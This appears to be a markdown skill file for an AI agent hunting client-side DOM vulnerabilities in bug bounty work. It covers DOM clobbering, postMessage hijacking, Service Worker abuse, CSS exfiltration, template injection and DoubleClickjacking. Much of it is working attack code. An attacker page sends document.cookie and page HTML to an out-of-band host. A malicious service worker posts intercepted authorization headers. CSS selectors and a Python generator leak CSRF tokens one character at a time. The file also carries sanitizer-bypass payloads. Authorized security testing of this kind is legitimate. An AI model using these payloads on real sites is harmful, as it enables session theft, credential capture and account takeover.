---
name: hunt-dom
description: "Hunt client-side DOM vulnerabilities — DOM Clobbering (overwrite JS globals via HTML injection), PostMessage hijacking (missing origin check), Service Worker abuse (intercept requests from same-origin script), CSS Injection/Exfiltration (attribute selectors → token char-by-char via OOB), client-side template injection, dangerouslySetInnerHTML. Grounded in named public research: Gareth Heyes / PortSwigger DOM-clobbering + DOM-Invader, Michał Bentkowski DOMPurify clobbering bypasses, jQuery htmlPrefilter XSS (CVE-2020-11022 / CVE-2020-11023), d0nut CSS-exfil research. Use when hunting DOM-XSS, client-side auth bypass, or token exfiltration without server-side interaction."
sources: portswigger_research, hackerone_public, github_security_advisories
report_count: 17
---

# HUNT-DOM — DOM Clobbering / PostMessage / Service Worker / CSS Exfil

## Crown Jewel Targets

DOM-based attacks execute in the victim's browser — the server often never sees the payload, so WAFs and server-side input filters do not apply. PostMessage missing-origin-check = cross-origin token theft with no XSS needed.

**Highest-value chains:**
- **DOM Clobbering → DOM-XSS / auth bypass** — HTML *markup* injection (no `<script>`) overwrites a JS global like `window.config` or shadows `document.getElementById`, and the app later treats that value as a URL/code → sink fires under a markup-only injection where script is filtered.
- **PostMessage no origin check → session theft / DOM-XSS** — a `message` handler that trusts `event.data` without validating `event.origin` lets an attacker iframe/opener drive privileged actions or feed a sink.
- **Service Worker abuse** — register a **same-origin** SW script (reachable because of an upload / open-redirect / path the target serves) via stored XSS → intercept all in-scope `fetch` → persistent credential capture.
- **CSS Exfil** — attribute-value selectors (`input[value^="a"]`) leak a CSRF token / API key / nonce char-by-char to an OOB host with zero JS.

### Grounding — public research this is distilled from
- **DOM Clobbering / DOM-Invader** — Gareth Heyes & the PortSwigger Web Security Academy "DOM clobbering" topic; DOM-Invader ships a dedicated clobbering scanner. Sink taxonomy maps to the academy's DOM-based vulnerability labs.
- **DOMPurify clobbering & mXSS bypasses** — Michał Bentkowski (Securitum) blog series on bypassing HTML sanitizers via clobbering and mutation XSS.
- **jQuery `htmlPrefilter` self-closing-tag XSS** — **CVE-2020-11022** and **CVE-2020-11023** (jQuery < 3.5.0). Passing attacker HTML to `.html()` / `.append()` mutates into executing markup. Grep bundled jQuery version; this is one of the most common real-world DOM-XSS roots.
- **CSS exfiltration** — d0nut "CSS Injection Attacks" / "Stealing Data With CSS" research (sequential `@import` recursion to drop the per-char-position constraint).
> Cite only what you reproduce. Do not paste these as "proof" in a report — your PoC against the live target is the evidence. Named research here is for *technique provenance*, not severity inflation.

---

## Attack Surface Signals

```
# Injection points that allow MARKUP but may strip <script>:
user bio / display name / comment / markdown preview / SVG upload / CMS rich-text

# postMessage endpoints (iframes, SSO widgets, payment frames, chat widgets):
*/sso/*  */embed/*  */widget/*  */oauth/*  /sdk.js  pay/checkout iframes

# Service worker presence:
/sw.js  /service-worker.js  /firebase-messaging-sw.js  /ngsw-worker.js (Angular)

# CSS injection points:
?theme=  custom-css profile field  email-template editor  style= passthrough
```

---

## Phase 1 — DOM Clobbering

```bash
# Signal: app reads element IDs/names as if they were JS objects, OR feeds a
# clobberable global into a sink (location, innerHTML, eval, script.src).
# Inject MARKUP (no script) at a sink that lets named/id'd elements through.

# Single-level clobber of window.config:
#   <a id="config" href="https://evil.com">
# Clobber a NON-built-in global the app reads (built-in methods like getElementById can't be shadowed this way):
#   <a id="config"></a><a id="config" name="url">   # window.config.url resolves to an attacker-controlled element/string
# Clobber a string-coerced URL value (anchor toString() == href):
#   <a id="x"></a><a id="x" name="y" href="https://evil.com">   # x.y -> href
# Nested window.a.b.c via form/inputs:
#   <form id="a"><input id="b" name="c" value="clobbered"></form>
# baseURI / relative-URL hijack:
#   <base href="https://evil.com/">      # bends every relative src/href
```

```javascript
// Browser console: find globals that are clobberable AND reach a sink.
// A var only matters if the app later concatenates it into a URL/HTML/eval.
const susp = ['config','settings','options','appConfig','init','data','user',
  'token','csrf','nonce','baseUrl','apiUrl','cdn','redirect','next','debug'];
susp.forEach(k => {
  const v = window[k];
  // HTMLCollection / element => already clobbered or clobberable namespace
  if (v && (v instanceof Element || v instanceof HTMLCollection))
    console.log('[CLOBBERED/NAMESPACE]', k, v);
  else if (v !== undefined) console.log('[GLOBAL]', k, '=', v);
});
```

```bash
# Source review: find globals fed into sinks (this is what makes clobbering exploitable)
curl -s "https://$TARGET/" | grep -nE \
  "document\.(getElementById|baseURI)|window\.[A-Za-z_]+\.(url|src|href|html|cmd)|\
location\s*=\s*[A-Za-z_]|\.innerHTML\s*=|eval\(|new Function\(|\.src\s*=\s*[A-Za-z_]"
# DOM-Invader (Burp) → enable "DOM clobbering" — it auto-finds clobberable sources→sinks.
```

**jQuery angle:** if the bundle ships jQuery < 3.5.0, attacker HTML passed to `.html()`/`.append()` self-mutates to execute (**CVE-2020-11022 / CVE-2020-11023**). Confirm version then test `<style><style /><img src=x onerror=alert(document.domain)>`.

---

## Phase 2 — PostMessage Hijacking

Two bug classes: (a) **listener** trusts cross-origin data → drive a sink/privileged action; (b) **sender** broadcasts secrets with target origin `'*'` → any framing page reads them.

```bash
# Find handlers and flag the ones with NO origin check
grep -rnE "addEventListener\(\s*['\"]message['\"]|onmessage\s*=" recon/$TARGET/ --include="*.js" 2>/dev/null \
  | grep -vE "\.origin\b" 
# Then for each, read +/- 20 lines: where does event.data go? (innerHTML/eval/location/token store)
# Senders that leak: grep for postMessage(<secret>, '*')
grep -rnE "postMessage\([^,]+,\s*['\"]\*['\"]\)" recon/$TARGET/ --include="*.js" 2>/dev/null
```

```html
<!-- PoC A: drive a no-origin-check LISTENER from an attacker page -->
<!-- Host on attacker.com; frames target and pushes a privileged message -->
<iframe id="f" src="https://TARGET/page-with-listener"></iframe>
<script>
  document.getElementById('f').onload = () => {
    const w = document.getElementById('f').contentWindow;
    // Shape the payload to whatever the handler routes into a sink:
    w.postMessage({type:'navigate', url:'javascript:fetch("https://OOB/x?c="+document.cookie)'}, '*');
    w.postMessage('<img src=x onerror=fetch("https://OOB/dom?h="+btoa(document.body.innerHTML))>', '*');
  };
</script>
```

```html
<!-- PoC B: capture secrets from a SENDER that uses targetOrigin '*' -->
<iframe id="f" src="https://TARGET/sso-or-widget" style="display:none"></iframe>
<pre id="out"></pre>
<script>
addEventListener('message', e => {
  // Only count it if e.origin is the TARGET and data carries a secret
  out.textContent += `origin=${e.origin}\ndata=${JSON.stringify(e.data)}\n---\n`;
  if (/token|session|jwt|code=/i.test(JSON.stringify(e.data)))
    fetch('https://OOB/pm?d='+encodeURIComponent(JSON.stringify(e.data))); // OOB proof
});
</script>
```

> False-positive guard: a handler with a *partial* check (`origin.indexOf('target.com')>-1`, `endsWith('target.com')`, regex `target\.com`) is still vulnerable — bypass with `target.com.evil.com` or `eviltarget.com`. Confirm by serving the PoC from such a look-alike host and showing the message still lands.

---

## Phase 3 — Service Worker Abuse

**Hard rule (corrects a common mistake):** a SW script URL **must be same-origin** as the page calling `register()`. A cross-origin script URL (`https://evil.com/sw.js`) throws `SecurityError` — there is **no header that enables cross-origin SW *script* registration**. `Service-Worker-Allowed` only widens the **scope** a same-origin script may control, not where the script may live.

So the realistic path is: get a SW script **onto the target origin** (file upload that serves JS, open-redirect/path the origin reflects as a script, a JSON/JSONP endpoint with `text/javascript`, or an existing route under your control), then register it from same-origin XSS.

```bash
# Enumerate existing SW + its scope
curl -s "https://$TARGET/" | grep -iE "serviceWorker\.register|navigator\.serviceWorker"
for p in sw.js service-worker.js firebase-messaging-sw.js ngsw-worker.js; do
  curl -s -o /dev/null -w "%{http_code} $p\n" "https://$TARGET/$p"; done
curl -s "https://$TARGET/sw.js" | grep -iE "scope|addEventListener\('fetch'|caches"
# Look for an upload/route that returns Content-Type: text/javascript on YOUR content:
#   curl -s -D- https://$TARGET/uploads/<id> | grep -i content-type
```

```javascript
// Runs in same-origin XSS. SCRIPT MUST BE SAME-ORIGIN (e.g. /uploads/evil-sw.js
// served by the target). scope must be <= the directory the script is served from
// unless the response carries Service-Worker-Allowed.
navigator.serviceWorker.register('/uploads/evil-sw.js', {scope: '/'})
  .then(r => fetch('https://OOB/sw-registered?scope='+r.scope))  // OOB proof of registration
  .catch(e => console.log('SW reg failed', e.name));  // SecurityError => wrong origin/scope

// evil-sw.js (served from the TARGET origin):
self.addEventListener('fetch', e => {
  e.respondWith(fetch(e.request.clone()).then(async resp => {
    // Exfil URL + any auth header the page attaches, to OOB
    fetch('https://OOB/sw-intercept', {method:'POST',
      body: JSON.stringify({url: e.request.url,
        auth: e.request.headers.get('authorization')})});
    return resp;
  }));
});
```

> Persistence note: a SW survives tab close and re-runs on next visit within scope — that is what makes it Critical. Confirm persistence by closing all tabs, reopening the origin, and showing a fresh OOB hit with no XSS re-trigger.

---

## Phase 4 — CSS Injection / Exfiltration

```bash
# Prereq: attacker controls CSS (custom-theme field, style= passthrough, email
# template, markdown CSS). Targets: hidden CSRF input, API key in meta, nonce attr.
# Step 1 confirm injection: inject "color:red" on a known element, observe render.
# Step 2 leak attribute values char-by-char via attribute selectors + url() to OOB.
```

> **Scope caveat (corrects an overstatement):** CSS exfil bypasses CSP that blocks *script execution* — it does **not** bypass a CSP whose `style-src` / `img-src` / `default-src` / `connect-src` restricts external origins, or `form-action`. If `img-src 'self'` is set, `url(https://OOB/...)` is **blocked**. Always read the live `Content-Security-Policy` header first; if external resource origins are locked down, CSS exfil is dead and you should say so rather than claim it.

```css
/* One request fires only for the matching first char. */
input[name="csrf"][value^="a"] { background: url(https://OOB.example/c?p=0&c=a); }
input[name="csrf"][value^="b"] { background: url(https://OOB.example/c?p=0&c=b); }
/* ...all chars... then chain @import to leak position 1 conditioned on position 0, etc. */
meta[name="csrf-token"][content^="a"] { background: url(https://OOB.example/c?m=a); }
```

```python
# Generate a single-position CSS exfil set (loop positions with sequential @import in practice)
import string
chars = string.ascii_letters + string.digits + '-_'
attr, oob, pos = 'name="csrf"', 'https://OOB.example/c', 0
print("\n".join(
  f'input[{attr}][value^="{c}"]{{background:url({oob}?p={pos}&c={c})}}' for c in chars))
# Real exfil needs recursion: serve a stylesheet whose @import pulls the next
# position's rules only after the current prefix matched (d0nut technique) —
# this removes the "static input, one char" limitation.
```

> Validation: the proof is **OOB hits**, not a rendered color. Stand up a Collaborator / request-bin and show one hit per correct character forming the real token, then demonstrate using that token in a state-changing CSRF request. No OOB callback = no finding (a 0-byte image or CSP-blocked request looks identical to success in DevTools).

---

## Phase 5 — dangerouslySetInnerHTML / framework sinks

```bash
grep -rnE "dangerouslySetInnerHTML|v-html=|\[innerHTML\]=|\.html\(" recon/$TARGET/ --include="*.js" 2>/dev/null
# In minified Next/React bundles:
curl -s "https://$TARGET/_next/static/chunks/pages/index.js" | grep -oP 'dangerouslySetInnerHTML.{0,120}'
# Trace whether user data reaches it WITHOUT a sanitizer (DOMPurify/sanitize-html).
# If DOMPurify IS present, check for clobbering/mXSS bypass (Bentkowski research) and version.
```

---

## Phase 6 — Client-Side Template Injection

```bash
# Detect framework, then test the {{}} sink in a sandbox-bypass form.
grep -rnE "angular|vue|handlebars|mustache|nunjucks|alpinejs|\bv-|ng-app" recon/$TARGET/ --include="*.js" 2>/dev/null | head
# Probe (server may render, so confirm it's CLIENT-side by viewing rendered DOM, not curl):
#   {{7*7}}  -> 49 in the live DOM (not in raw HTML) => CSTI
# AngularJS sandbox-escape style payloads (version-dependent; older 1.x):
#   {{constructor.constructor('alert(document.domain)')()}}
# Vue: {{_c.constructor('alert(1)')()}}    (varies by Vue 2/3 build)
```

---

## Phase 7 — XSSI (Cross-Site Script Inclusion)

Cross-origin theft of dynamic-JS/JSON responses that embed per-user secrets. A victim's browser sends their cookies when an attacker page `<script src>`-loads the endpoint, and the response body becomes readable cross-origin if it isn't a guarded pure-JSON object. This is the read-side cousin of CSRF — and CORS does NOT stop `<script>` includes.

```bash
# Signal: authenticated endpoints returning JS or JSON-ish bodies with user data,
# served WITHOUT a parser-breaking prefix and WITHOUT a strict JSON Content-Type.
#   - global var assignment:        var userData = {...}      <- directly leakable
#   - JSONP:                        callback({...})           <- name the callback, steal it
#   - bare JSON array:              [{"email":"..."}]         <- legacy array-constructor leak
#   - non-guarded object literal returned as text/javascript
# Probe cross-origin from an attacker-origin page:
#   <script>var userData=null;</script>
#   <script src="https://TARGET/api/me.js"></script>     # if it assigns a global, read it
#   <script>fetch... NO — the point is <script>, which bypasses SOP read-restriction for executable JS
```

- **Leakable shapes**: global-var assignment, JSONP (override the callback name), bare top-level JSON arrays on old engines, and any sensitive body served as `text/javascript`/`application/javascript`.
- **Defenses that kill it** (confirm their ABSENCE before reporting): a JSON anti-hijacking prefix (`)]}',\n`, `while(1);`, `for(;;);`), strict `Content-Type: application/json` + `X-Content-Type-Options: nosniff`, requiring a custom header / non-simple request, and SameSite cookies (which also blunt the cross-site cookie send).
- **Proof**: a real attacker-origin HTML page that loads the endpoint via `<script>` and exfiltrates the parsed secret to OOB — not a same-origin fetch. Token/PII leak cross-origin = the impact.

---

## Phase 8 — DoubleClickjacking (frameless UI redress)

Classic clickjacking needs an iframe, so `X-Frame-Options` / CSP `frame-ancestors` / `SameSite` cookies defeat it. DoubleClickjacking (Paulos Yibelo, Dec 2024) uses **no frame** and bypasses all of them.

```
# Attacker page shows a "double-click to verify" decoy (fake CAPTCHA).
# 1) User mousedowns the FIRST click on the decoy button.
# 2) onmousedown: window.opener.location (or this window) navigates the TOP window
#    to the real sensitive page — e.g. https://target/oauth/authorize?...client_id=attacker
#    and the decoy popup is closed.
# 3) The SECOND click of the user's double-click lands on the now-foregrounded
#    legitimate "Authorize" / "Confirm" / "Delete account" button.
```

- **Why defenses fail:** the target is a real top-level same-site document, not framed — XFO, `frame-ancestors`, and SameSite never engage. The whole attack is timing + window swapping.
- **Targets:** any one-click sensitive action — OAuth consent (→ ATO), "delete account", settings/email change, OAuth-app authorization, browser-extension permission grants, web3 transaction approval.
- **Proof:** a working attacker page that swaps the window on first mousedown and lands the second click on the live target button; show the privileged action completing. A static mockup is not proof.
- **Defense to recommend:** gate sensitive buttons behind a real gesture/visibility check — disable until `mouseup` on the actual control, or require a deliberate non-double-click interaction.

Source: https://www.infosecurity-magazine.com/news/doubleclickjacking-attack-bypasses/

---

## Recent sanitizer/DOM research (2024-2026)

Modern sanitizer and DOM-clobbering research: the sanitizer/browser-native API itself is increasingly the gadget, and clobbering has deeper multi-level primitives than the classic single/nested cases in Phase 1.

1. **DOMPurify config-object prototype-pollution gadget (CVE-2026-41238)** — DOMPurify's default config parser falls back through `Object.prototype`, so any existing client-side PP (`__proto__[ALLOWED_ATTR]`, `RETURN_TRUSTED_TYPE`, etc.) silently rewrites the sanitizer's own config at call time, turning a "safe default" `DOMPurify.sanitize(x)` into XSS pass-through — affects 3.0.1–3.3.3 with NO app-side misconfig. Inverts the PP hunt: the sanitizer itself is the gadget. Source: https://labs.trace37.com/blog/dompurify-pp-ceh-bypass/
2. **DOMPurify template-literal regex mXSS (CVE-2025-26791)** — In `SAFE_FOR_TEMPLATES` mode the `TMPLIT_EXPR` regex regressed to `/\${[\w\W]/gm` (missing closing brace), so a template expression omitting `}` survives sanitization and the browser fixup reconstitutes it into live markup. Fixed 3.2.4. Source: https://www.cve.news/cve-2025-26791/
3. **DOMPurify hook/config misconfig catalog** — Per-`sanitize()`-call tests: `uponSanitizeAttribute→forceKeepAttr=true` skips URI regex (drawio); `ADD_URI_SAFE_ATTR:['href']` re-enables `javascript:`; `SAFE_FOR_XML:false` drops the `</style>`/`-->` guard; `afterSanitizeAttributes` string-`replace`/`toUpperCase` (`'ﬆ'.toUpperCase()==='ST'`) rebuilds `</STYLE>`; SVG `<style>` has lowercase `nodeName==="style"` so uppercase-only removal hooks miss it; `<base href>` makes hooks see a different URL than the DOM gets. Audit each call's config+hooks, not just the version. Source: https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations
4. **Chrome Sanitizer API (`setHTML`) bypasses** — (1) SVG `<animate attributeName="xlink:href:x" values="javascript:alert(1)">`: parser keeps only first two colon segments so the animation still targets `xlink:href` while the sanitizer's exact-string block fails; (2) `<form action="javascript://://-alert(1)//">`: fast-path protocol checker treats it as protocol-less, then Chrome's form re-serialization normalizes it into executable `javascript:`. The browser-native Sanitizer is treated as safe and nobody fuzzes it. Source: https://slcyber.io/research-center/two-bypasses-for-chromes-sanitizer-api/
5. **DOMino-Effect deep DOM-clobbering gadgets (USENIX 2025)** — Three previously-missed primitives beyond single-global/two-level: `<input form=ID>` clobbers property lookups on `<form id=ID>`; nested `window` proxy chaining; shared-`id`→`HTMLCollection` where a child `name=` attr creates nested addressable props (`x.y.z`) → multi-level `document.x.y` clobbering. Zero-days found in Google API client, Closure, MathJax, Webpack. Source: https://www.usenix.org/system/files/usenixsecurity25-liu-zhengyu.pdf
6. **sanitize-html mXSS via htmlparser2 parsing differential** — sanitize-html parses with non-spec-compliant `htmlparser2`, so markup it deems benign is re-fixed by the browser into executable HTML (context-breakout in `<title>`/`<style>`/`<textarea>`/attribute contexts). Distinct from DOMPurify; huge Node/SSR footprint. Test foreign-content/RCDATA-boundary payloads in a real browser. Source: https://sonarsource.github.io/mxss-cheatsheet/explained/
7. **Server-side DOMPurify context-breakout (no output-context awareness)** — When sanitized output is concatenated into a non-`body` context like `"<textarea>"+DOMPurify.sanitize(input)+"</textarea>"` or inside `<style>/<title>`, a payload `<div id="</textarea><img src=x onerror=alert()>">` breaks out because DOMPurify sanitizes assuming `body` context but the insertion point is RCDATA. SSR/isomorphic apps (DOMPurify+jsdom); the sanitizer is correct but the placement is the bug. Source: https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations
8. **Client-Side Path Traversal (CSPT) — the DOM-side primitive** — Client JS builds a fetch/XHR path by concatenating an attacker-influenced value (URL path segment, hash, `id` param, imported filename) into an API URL *without* normalization: `fetch('/api/v1/items/' + userInput)`. Feeding `../../` reroutes the same-origin, credentialed request to a DIFFERENT endpoint the app never intended (`../../admin/deleteUser/123`, `../../../me/reset`). Alone it reads/hits an unintended endpoint; it becomes CSPT2CSRF (state-change with the victim's session) when the traversed target is a sink, and can be chained to exfil when the response is reflected into the DOM. Hunt every client-built request path for un-normalized user input; try `%2e%2e%2f`, `..%2f`, and trailing-segment injection. Sinks: `fetch`/`axios`/`XMLHttpRequest` with string-concatenated paths. Pairs with `hunt-csrf` (CSPT2CSRF). Source: https://blog.doyensec.com/2025/01/09/cspt-file-upload.html
9. **CSP nonce theft via cached response / dangling markup** — A strict nonce-CSP is defeated when the nonce is *predictable, reused, or leakable*: a cached HTML response served to multiple users repeats the same `nonce=`, so an attacker who reads it once can craft an inline `<script nonce=...>` that any victim's browser accepts; or a dangling-markup / CSS-attribute-selector leak exfiltrates the per-response nonce char-by-char, after which an HTML-injection point becomes full script execution. Check: is the nonce truly per-response-random, and is the nonce'd page ever cached (CDN, disk, back-forward cache)? A nonce that survives caching is not a nonce. Source: https://portswigger.net/research/bypassing-csp-with-dangling-iframes

---

## Chain Table

| DOM finding | Chain to | Impact |
|-------------|----------|--------|
| DOM Clobbering → clobbered URL into `script.src`/`location` | DOM-XSS under markup-only injection | High / auth bypass |
| PostMessage no/weak origin check (listener) | data → innerHTML/eval/location sink | DOM-XSS → ATO |
| PostMessage `targetOrigin:'*'` sender | any framing page reads token/auth code | Cross-origin token theft |
| CSS exfil (OOB-confirmed) | leak CSRF token → fire CSRF | CSRF chain (Medium+) |
| Same-origin Service Worker via XSS | intercept all in-scope fetch + auth headers | Persistent ATO (Critical) |
| dangerouslySetInnerHTML, no sanitizer | stored DOM-XSS | XSS → ATO |

---

## Tools

```bash
# DOM Invader (built into Burp browser) — sources→sinks, postMessage logger, clobbering scanner
# postMessage-tracker — Chrome extension logging cross-window messages
# Burp Collaborator / interactsh / request-bin — MANDATORY OOB sink for CSS-exfil & SW PoCs
# Verify any tool URL before citing it in a report; do not paste unverified repo links.
```

---

## Validation (false-positive discipline)

Match the repo standard: a technique that *fires in DevTools* is not a finding until impact is **OOB-confirmed** and **state-proven**.

- **DOM Clobbering** — show the clobbered value actually reaching a sink (XSS payload executes, or app navigates/loads from attacker URL). A clobberable global that never reaches a sink = no impact, do not report.
- **PostMessage** — distinguish a *missing* check from a *weak* one; bypass weak checks from a look-alike origin and capture via OOB. A noisy `message` log alone is not proof — show the privileged action or token exfil.
- **CSS exfil** — **OOB callback per correct character is the only proof.** Read CSP first: `img-src`/`style-src`/`connect-src`/`default-src` restricting external origins kills it. A blocked `url()` is indistinguishable from success in the Network tab — confirm on the Collaborator side.
- **Service Worker** — registration must be **same-origin script**; a `SecurityError` means you cited the wrong origin. Prove *persistence* (close tabs → reopen → fresh OOB hit, no XSS re-fire).
- **General** — unique per-test markers (`btoa(domain)+nonce`) so an OOB hit is attributable to YOUR payload and not background traffic; body-diff the rendered DOM, not the raw HTML, since these are client-side.

**Severity:**
- Same-origin Service Worker → persistent credential intercept: **Critical**
- PostMessage data → DOM-XSS / token theft → ATO: **High–Critical**
- DOM Clobbering → DOM-XSS reaching auth/session: **High**
- CSS exfil of CSRF token (OOB-proven) → CSRF: **Medium** (raise if the chained CSRF is account-critical)
